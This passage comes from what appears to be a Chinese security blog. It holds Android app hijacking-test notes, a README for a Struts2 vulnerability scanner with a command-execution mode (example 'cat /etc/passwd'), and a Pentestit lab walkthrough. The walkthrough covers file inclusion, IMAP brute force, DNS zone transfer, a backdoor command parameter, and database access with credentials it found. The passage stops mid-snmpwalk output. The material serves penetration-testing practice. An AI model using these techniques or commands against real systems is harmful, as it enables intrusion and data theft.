class="regexp">/apaches/</span>commons<span class="regexp">/codec/</span>language<span class="regexp">/bm/</span>sep_exact_portuguese.txt</span><br><span class="line">  正在签名: org<span class="regexp">/apaches/</span>commons<span class="regexp">/codec/</span>language<span class="regexp">/bm/</span>sep_exact_spanish.txt</span><br><span class="line">  正在签名: org<span class="regexp">/apaches/</span>commons<span class="regexp">/codec/</span>language<span class="regexp">/bm/</span>sep_hebrew_common.txt</span><br><span class="line">  正在签名: org<span class="regexp">/apaches/</span>commons<span class="regexp">/codec/</span>language<span class="regexp">/bm/</span>sep_lang.txt</span><br><span class="line">  正在签名: org<span class="regexp">/apaches/</span>commons<span class="regexp">/codec/</span>language<span class="regexp">/bm/</span>sep_languages.txt</span><br><span class="line">  正在签名: org<span class="regexp">/apaches/</span>commons<span class="regexp">/codec/</span>language<span class="regexp">/bm/</span>sep_rules_any.txt</span><br><span class="line">  正在签名: org<span class="regexp">/apaches/</span>commons<span class="regexp">/codec/</span>language<span class="regexp">/bm/</span>sep_rules_french.txt</span><br><span class="line">  正在签名: org<span class="regexp">/apaches/</span>commons<span class="regexp">/codec/</span>language<span class="regexp">/bm/</span>sep_rules_hebrew.txt</span><br><span class="line">  正在签名: org<span class="regexp">/apaches/</span>commons<span class="regexp">/codec/</span>language<span class="regexp">/bm/</span>sep_rules_italian.txt</span><br><span class="line">  正在签名: org<span class="regexp">/apaches/</span>commons<span class="regexp">/codec/</span>language<span class="regexp">/bm/</span>sep_rules_portuguese.txt</span><br><span class="line">  正在签名: org<span class="regexp">/apaches/</span>commons<span class="regexp">/codec/</span>language<span class="regexp">/bm/</span>sep_rules_spanish.txt</span><br><span class="line">&gt;&gt;&gt; 签名者</span><br><span class="line">    X.<span class="number">509</span>, CN=x51, OU=www.utf32.com, O=www.utf32.com, L=BeiJing, ST=Beijing, C=CN</span><br><span class="line">    [可信证书]</span><br><span class="line"></span><br><span class="line">jar 已签名。</span><br><span class="line"></span><br><span class="line">警告:</span><br><span class="line">签名者证书为自签名证书。</span><br></pre></td></tr></table></figure>
<h2 id="测试结果-3"><a href="#测试结果-3" class="headerlink" title="测试结果"></a>测试结果</h2><p>修改成功截图：  </p>
<p><img src="/images/pasted-100.png" alt="upload successful"> </p>
<h2 id="其他说明-3"><a href="#其他说明-3" class="headerlink" title="其他说明"></a>其他说明</h2><h1 id="五、代码保护"><a href="#五、代码保护" class="headerlink" title="五、代码保护"></a>五、代码保护</h1><h2 id="测试方法-4"><a href="#测试方法-4" class="headerlink" title="测试方法"></a>测试方法</h2><p>此项一般测试客户端是否有代码混淆、客户端加壳等措施，使用jad直接打开apk文件查看：  </p>
<p><img src="/images/pasted-101.png" alt="upload successful"><br>是否混淆/加壳也比较容易判断，免赘述。</p>
<h2 id="测试结果-4"><a href="#测试结果-4" class="headerlink" title="测试结果"></a>测试结果</h2><p>略</p>
<h2 id="其他说明-4"><a href="#其他说明-4" class="headerlink" title="其他说明"></a>其他说明</h2><ul>
<li>如果目标APP已加壳/混淆，                                  不再继续脱壳/反混淆操作。  </li>
</ul>
<h1 id="六、界面劫持保护"><a href="#六、界面劫持保护" class="headerlink" title="六、界面劫持保护"></a>六、界面劫持保护</h1><h2 id="测试方法-5"><a href="#测试方法-5" class="headerlink" title="测试方法"></a>测试方法</h2><p><em>大概原理：恶意软件监控栈顶程序，如果发现当前栈顶是目标页面，则替换之，达到劫持目的。具体关于栈、Activity等概念此处省略。Android系统更新到6.0以后，对权限的管理机制发生变化，通过以下方法获取栈顶程序不再有效。</em><br>实现了一个简单的测试工具，输入目标包名即可在APP启动时进行劫持，劫持效果为一个透明页面：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">RelativeLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:app</span>=<span class="string">"http://schemas.android.com/apk/res-auto"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:orientation</span>=<span class="string">"vertical"</span></span></span><br><span class="line"><span class="tag"><span class="attr">tools:context</span>=<span class="string">".MainActivity"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/textView"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_centerHorizontal</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_centerVertical</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"该页面存在被劫持风险！   \n tested by www.utf32.com."</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">RelativeLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-129.png" alt="upload successful">    </p>
<h2 id="测试结果-5"><a href="#测试结果-5" class="headerlink" title="测试结果"></a>测试结果</h2><p>启动劫持服务，默认目标：com.android.settings，打开系统设置，劫持成功：  </p>
<p><img src="/images/pasted-130.png" alt="upload successful"><br>当前栈内Activity情况：  </p>
<p><img src="/images/pasted-131.png" alt="upload successful">  </p>
<h2 id="其他说明-5"><a href="#其他说明-5" class="headerlink" title="其他说明"></a>其他说明</h2></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-01-16T09:34:27.000Z" title="2020-01-16T09:34:27.000Z">2020-01-16</time><span class="level-item"> x51 </span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/01/16/Struts2%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8FGolang%E7%89%88/">Struts2全漏洞扫描Golang版</a></h1><div class="content"><h1 id="STS2G"><a href="#STS2G" class="headerlink" title="STS2G"></a>STS2G</h1><p>项目地址：<strong><a href="https://github.com/x51/STS2G">https://github.com/x51/STS2G</a></strong><br>Struts2漏洞测试-Golang版，部分POC参考了众多优秀项目如<a href="https://github.com/HatBoy/Struts2-Scan">Struts2-Scan</a>，漏洞测试环境采用<a href="https://github.com/vulhub/vulhub/tree/master/struts2">vulhub</a>.<br>目前两种模式<code>scan</code>和<code>exec</code>支持：<br><em>struts2-001</em><br><em>struts2-005</em><br><em>struts2-007</em><br><em>struts2-008</em><br><em>struts2-009</em><br><em>struts2-012</em><br><em>struts2-013</em><br><em>struts2-015</em><br><em>struts2-016</em><br><em>struts2-045</em><br><em>struts2-046</em><br><em>struts2-048</em><br><em>struts2-053</em><br><em>struts2-057</em>  </p>
<h4 id="开发目的"><a href="#开发目的" class="headerlink" title="开发目的"></a>开发目的</h4><p>1、适用于命令行下操作，比如webshell下测试内网struts2漏洞.<br>2、可编译Windows/Linux平台可执行文件.<br>3、单文件运行.  </p>
<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">D:\Struts2-Test&gt;ST2SG.<span class="keyword">exe</span> -h</span><br><span class="line">NAME:</span><br><span class="line">   ST2SG - Struts2 Scanner Written in Golang</span><br><span class="line"></span><br><span class="line">USAGE:</span><br><span class="line">   ST2SG --url http://xxxxxxx.<span class="keyword">com</span>/test.action --<span class="keyword">vn</span> <span class="number">15</span> --<span class="keyword">mode</span> scan</span><br><span class="line"></span><br><span class="line">AUTHOR:</span><br><span class="line">   x51 &lt;x51enter@gmail.<span class="keyword">com</span>&gt;</span><br><span class="line"></span><br><span class="line">COMMANDS:</span><br><span class="line">   <span class="keyword">help</span>, h  Shows <span class="keyword">a</span> <span class="keyword">list</span> of commands <span class="built_in">or</span> <span class="keyword">help</span> <span class="keyword">for</span> one <span class="keyword">command</span></span><br><span class="line"></span><br><span class="line">GLOBAL OPTIONS:</span><br><span class="line">   --<span class="keyword">mode</span> value  Specify work <span class="keyword">mode</span></span><br><span class="line">   --<span class="keyword">vn</span> value    Vulnerability <span class="keyword">number</span> (defaul<span class="variable">t:</span> <span class="number">0</span>)</span><br><span class="line">   --url value   Set target url</span><br><span class="line">   --cmd value   Exec <span class="keyword">command</span>(Only works <span class="keyword">on</span> <span class="keyword">mode</span> exec.)</span><br><span class="line">   --data value  Specific vulnerability packets</span><br><span class="line">   --<span class="keyword">help</span>, -h    show <span class="keyword">help</span> (defaul<span class="variable">t:</span> false)</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/x51/STS2G/raw/master/Example.png" alt="avatar">  </p>
<h5 id="默认扫描模式"><a href="#默认扫描模式" class="headerlink" title="默认扫描模式:"></a>默认扫描模式:</h5><p><code>ST2SG --url http://xxx.com/index.action --mode scan</code></p>
<h5 id="指定漏洞扫描模式："><a href="#指定漏洞扫描模式：" class="headerlink" title="指定漏洞扫描模式："></a>指定漏洞扫描模式：</h5><p><code>ST2SG --url http://xxx.com/index.action --vn 15 --mode scan</code>  </p>
<h5 id="命令执行模式："><a href="#命令执行模式：" class="headerlink" title="命令执行模式："></a>命令执行模式：</h5><p><code>ST2SG --url http://xxx.com/index.action --vn 15 --mode exec --cmd &quot;cat /etc/passwd&quot;</code>  </p>
<h5 id="自定义参数："><a href="#自定义参数：" class="headerlink" title="自定义参数："></a>自定义参数：</h5><p><em>基于以上方法，分两种情况，自定义GET参数名，和自定义POST数据包内容，POST方式需要在数据包中指定一下要测试的参数并用fuckit标记出来.</em>  </p>
<h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>1、强烈建议使用vn参数；<br>2、自定义POC只需在utils中修改为自己的即可；<br>3、部分漏洞支持获取webpath，功能函数已经在各自漏洞模块中实现（func GetWebPath），可自行调用；</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-01-07T03:19:17.000Z" title="2020-01-07T03:19:17.000Z">2020-01-07</time><span class="level-item"> x51 </span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/01/07/Pentestit-Lab-14-Writeup-Walkthrough/">Pentestit Lab 14 Writeup/Walkthrough</a></h1><div class="content"><p>Pentestit Lab 14放出来时间快一个月了,中途断断续续做了一次,因为是第一次做这个系列靶机,很多关卡难免绕弯路,部分脑洞也是感谢热心群友提醒(比如vpn关卡),在这儿从原始笔记摘出有用的信息来把过程记录下.<br>关卡列表:</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Site</span><br><span class="line">Mail</span><br><span class="line">Vpn-1</span><br><span class="line">Ns</span><br><span class="line">Ad</span><br><span class="line">News</span><br><span class="line">Router</span><br><span class="line">Terminal-1</span><br><span class="line">Fpm</span><br><span class="line">Java</span><br><span class="line">Certificate</span><br><span class="line">Password——verfify</span><br><span class="line">Db</span><br><span class="line">User</span><br><span class="line">Dump</span><br><span class="line">Git</span><br><span class="line">Vpn-2</span><br><span class="line">Wiki</span><br><span class="line">Terminal-2</span><br><span class="line">Elasticsearch</span><br></pre></td></tr></table></figure>
<h6 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h6><p>实验室环境需要VPN接入,但国内访问困难,需要在配置文件中设置代理(OpenVPN Windows客户端也有设置代理选项).  </p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Lab's gateways:  </span><br><span class="line"><span class="number">192.168.101.14</span>  </span><br><span class="line"><span class="number">192.168.101.15</span></span><br></pre></td></tr></table></figure>
<p>连接成功实验室环境后,ping测网关确认网络ok:  </p>
<p><img src="/images/pasted-53.png" alt="upload successful"><br>建议操作环境:Windows物理机+Kali Linux虚拟机  </p>
<h5 id="Site"><a href="#Site" class="headerlink" title="Site"></a>Site</h5><p>先探测下端口开放情况:  </p>
<p><img src="/images/pasted-54.png" alt="upload successful"><br>访问80端口会重定向到site.test.lab,绑定host后访问  </p>
<p><img src="/images/pasted-55.png" alt="upload successful"><br>从源码可以发现站点是wordpress搭建的,探测一下插件情况:  </p>
<p><img src="/images/pasted-56.png" alt="upload successful"><br>看一下该插件历史漏洞:  </p>
<p><img src="/images/pasted-57.png" alt="upload successful"><br>尝试默认POC利用失败,会返回一个自定义的错误页面,猜测是做了防护?但深入探测发现:  </p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">包含/etc/passwd			      状态码:<span class="number">222</span>  </span><br><span class="line">包含count_of_send.php		    状态码:<span class="number">500</span>  </span><br><span class="line">包含任意不存在文件test.aaa       状态码:<span class="number">404</span></span><br></pre></td></tr></table></figure>
<p>这儿注意一下状态码,状态500应该是包含成功,222是被拦截,404是文件不存在,继续fuzz一下文件发现:  </p>
<p><img src="/images/pasted-58.png" alt="upload successful"><br>在/etc/group发现token:  </p>
<p><img src="/images/pasted-59.png" alt="upload successful">  </p>
<h5 id="Mail"><a href="#Mail" class="headerlink" title="Mail"></a>Mail</h5><p>记得上面Nmap探测结果吗?192.168.101.14还开放143端口和8080端口,143是IMAP服务,访问8080发现邮箱登录入口,猜测这儿是让登录邮箱账号.  </p>
<p><img src="/images/pasted-60.png" alt="upload successful"><br>从site收集到四个邮箱地址: (首页三个,自定义404页面一个) </p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Sales Department:  sidorov@<span class="keyword">test</span>.<span class="keyword">lab</span> </span><br><span class="line"><span class="keyword">PR</span> Department： 	 ivanov@<span class="keyword">test</span>.<span class="keyword">lab</span></span><br><span class="line">IT Department：   petrov@<span class="keyword">test</span>.<span class="keyword">lab</span></span><br><span class="line">Support：		 support@<span class="keyword">test</span>.<span class="keyword">lab</span></span><br></pre></td></tr></table></figure>
<p>Web登录带csrf_token  </p>
<p><img src="/images/pasted-61.png" alt="upload successful"><br>处理起来比较麻烦,直接爆破imap服务:  </p>
<p><img src="/images/pasted-62.png" alt="upload successful"><br>登录邮箱,未读邮件中发现token  </p>
<p><img src="/images/pasted-63.png" alt="upload successful">  </p>
<h5 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h5><p>翻邮箱,把三个文件都下载下来看  </p>
<p><img src="/images/pasted-64.png" alt="upload successful"><br>反编译client.jar  </p>
<p><img src="/images/pasted-65.png" alt="upload successful"><br>看程序流程,一个ssh登录操作,在这之前会处理一下密码,直接运行一下拿到登录密码:  </p>
<p><img src="/images/pasted-66.png" alt="upload successful"><br>(BTW,该SSH登录密码就是JAVA的token,坑!!!)  </p>
<h5 id="Terminal-2"><a href="#Terminal-2" class="headerlink" title="Terminal-2"></a>Terminal-2</h5><p>使用拿到的ssh账号密码登录服务器,find大法发现token:  </p>
<p><img src="/images/pasted-67.png" alt="upload successful"><br>继续信息搜集,发现用户目录下有个.crt文件夹,下载回本地   </p>
<h5 id="NS"><a href="#NS" class="headerlink" title="NS"></a>NS</h5><p>其实看到这个关卡名称时就应该能猜到是nslookup,内网出现nslookup一般就在DNS区域传送上,所以直接找DNS服务器然后利用就行.  </p>
<p><img src="/images/pasted-68.png" alt="upload successful"><br>发现172.16.0.10、172.16.0.20两个DNS服务器  </p>
<p><img src="/images/pasted-69.png" alt="upload successful"><br>在172.16.0.10上利用成功,并且拿到一份内网域名列表.整理一下:  </p>
<p><img src="/images/pasted-70.png" alt="upload successful">  </p>
<h5 id="AD"><a href="#AD" class="headerlink" title="AD"></a>AD</h5><p>两个DC，目前我们在172.16.0.0/24，也就是DC2所处的网络，DC2域控服务器情况:  </p>
<p><img src="/images/pasted-71.png" alt="upload successful"><br>SMB用户枚举,发现token  </p>
<p><img src="/images/pasted-72.png" alt="upload successful">  </p>
<h5 id="VPN-2"><a href="#VPN-2" class="headerlink" title="VPN-2"></a>VPN-2</h5><p>访问vpn2.test.lab,Web根目录下存在token  </p>
<p><img src="/images/pasted-75.png" alt="upload successful">  </p>
<h5 id="News"><a href="#News" class="headerlink" title="News"></a>News</h5><p>利用前面拿到的dev.crt和dev.key,连接另一个VPN网络(修改第一个VPN配置文件中的IP地址即可,连接时加参数–key和–cert)<br>探测一下172.16.50.0/24存活  </p>
<p><img src="/images/pasted-83.png" alt="upload successful">  </p>
<p>访问news,需要登录,没有其他任何提示,目录扫描无果  </p>
<p><img src="/images/pasted-73.png" alt="upload successful">  </p>
<p>尝试通用口令    </p>
<p><img src="/images/pasted-74.png" alt="upload successful">  </p>
<p>登录dev成功  </p>
<p><img src="/images/pasted-76.png" alt="upload successful"><br>没有什么发现,尝试拿生日去爆破也没结果(后来得知需要fuzz敏感文件,任何提示都木得….)<br>这儿是个不常见的后缀<code>.save</code>比较简单的代码审计,当<code>debug</code>参数等于字符串<code>dawdawgoiagi2re0</code>,则执行参数<code>cmd</code><br><img src="/images/pasted-77.png" alt="upload successful">  </p>
<p>构造命令执行POC:  </p>
<p><img src="/images/pasted-78.png" alt="upload successful">  </p>
<p><img src="/images/pasted-79.png" alt="upload successful"><br>继续find大法!  </p>
<p><img src="/images/pasted-80.png" alt="upload successful">  </p>
<h5 id="DB"><a href="#DB" class="headerlink" title="DB"></a>DB</h5><p>发现上面源码审计时包含了一个DB.php文件,看一看  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $DB_HOST = <span class="string">'172.16.40.5'</span>;</span><br><span class="line"><span class="keyword">private</span> $DB_USER = <span class="string">'php-site'</span>;</span><br><span class="line"><span class="keyword">private</span> $DB_PASS = <span class="string">'fqafG32rGpwvbcsof'</span>;</span><br><span class="line"><span class="keyword">private</span> $DB_NAME = <span class="string">'php_site'</span>;</span><br><span class="line"><span class="keyword">private</span> $LINK;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* DB constructor.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$link = <span class="keyword">new</span> mysqli(<span class="keyword">$this</span> -&gt; DB_HOST,<span class="keyword">$this</span> -&gt; DB_USER,<span class="keyword">$this</span> -&gt; DB_PASS,<span class="keyword">$this</span> -&gt; DB_NAME);</span><br><span class="line"><span class="keyword">if</span> (!$link)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Невозможно подключиться к базе данных</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$link -&gt;query(<span class="string">"SET NAMES 'utf8' "</span>);</span><br><span class="line"><span class="keyword">$this</span> -&gt; LINK = $link;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isLoginCorrect</span><span class="params">($login, $password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">$login = <span class="keyword">$this</span> -&gt;LINK -&gt; real_escape_string($login);</span><br><span class="line">$query = <span class="keyword">$this</span> -&gt; LINK -&gt; prepare(<span class="string">"select password from user where login = ?"</span>);</span><br><span class="line">$query-&gt;bind_param(<span class="string">'s'</span>,$login);</span><br><span class="line">$query-&gt;execute();</span><br><span class="line">$result = $query-&gt;get_result();</span><br><span class="line">$data = $result-&gt;fetch_assoc();</span><br><span class="line">$pas = md5(md5($password));</span><br><span class="line"></span><br><span class="line"><span class="comment">// if (md5(md5($password)) === $data['password'])</span></span><br><span class="line"><span class="keyword">if</span> ($pas === $data[<span class="string">'password'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAllPosts</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$query = <span class="keyword">$this</span>-&gt;LINK -&gt;query(<span class="string">'select id from posts order by date DESC '</span>);</span><br><span class="line">$resultQuery = $query -&gt; fetch_all();</span><br><span class="line">$result = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span> ($resultQuery <span class="keyword">as</span> $row)</span><br><span class="line">&#123;</span><br><span class="line">array_push($result,$row[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (count($result) &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPostByID</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"Post.php"</span>;</span><br><span class="line"><span class="keyword">if</span> (!is_numeric($id)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">$query = <span class="keyword">$this</span>-&gt;LINK -&gt;prepare(<span class="string">'select team,author,text,date from posts where id = ?'</span>);</span><br><span class="line">$query-&gt;bind_param(<span class="string">'i'</span>,$id);</span><br><span class="line">$query-&gt;execute();</span><br><span class="line">$resultQuery = $query-&gt;get_result();</span><br><span class="line">$data = $resultQuery-&gt;fetch_assoc();</span><br><span class="line">$result = <span class="keyword">new</span> Post($id,$data[<span class="string">'team'</span>],$data[<span class="string">'date'</span>],$data[<span class="string">'author'</span>],$data[<span class="string">'text'</span>]);</span><br><span class="line"><span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getSearch</span> <span class="params">($text)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$text = <span class="keyword">$this</span> -&gt;LINK -&gt; real_escape_string($text);</span><br><span class="line">$query = <span class="keyword">$this</span>-&gt;LINK -&gt;prepare(<span class="string">'select id from posts where text like ?'</span>);</span><br><span class="line">$text = <span class="string">"%"</span>.$text.<span class="string">"%"</span>;</span><br><span class="line">$query-&gt;bind_param(<span class="string">'s'</span>, $text);</span><br><span class="line">$query-&gt;execute();</span><br><span class="line"></span><br><span class="line">$resultQuery = $query-&gt;get_result();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$result = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span> ($resultQuery <span class="keyword">as</span> $row)</span><br><span class="line">&#123;</span><br><span class="line">array_push($result,$row[<span class="string">'id'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (count($result) &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>拿到了数据库服务器IP\账户\密码,想办法拖数据<br>不登陆MySQL查询:  </p>
<p><img src="/images/pasted-81.png" alt="upload successful"><br>最终获取token的完整POC:  </p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h <span class="number">172.16</span><span class="number">.40</span><span class="number">.5</span> -P3306 -u php-site -p'fqafG32rGpwvbcsof' -D php -se <span class="string">"select * from other;"</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-82.png" alt="upload successful">  </p>
<h5 id="Router"><a href="#Router" class="headerlink" title="Router"></a>Router</h5><p>观察从DNS区域传送漏洞拿到的内网域名列表和172.16.50.x这个C段的探测结果,发现172.16.50.50这个IP没有对应在内网域名上,进一步探测发现开放161端口(SNMP) ,爆破SNMP Community字符串  </p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.16.50.50</span> <span class="string">[skywalker]</span> VyOS <span class="number">1</span>.<span class="number">2</span>-rolling-<span class="number">201910230117</span></span><br></pre></td></tr></table></figure>
<p>利用snmpwalk获取详细信息  </p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">oot@</span>kali:~# snmpwalk -c skywalker <span class="number">172.16</span><span class="number">.50</span><span class="number">.50</span> -v <span class="number">1</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span 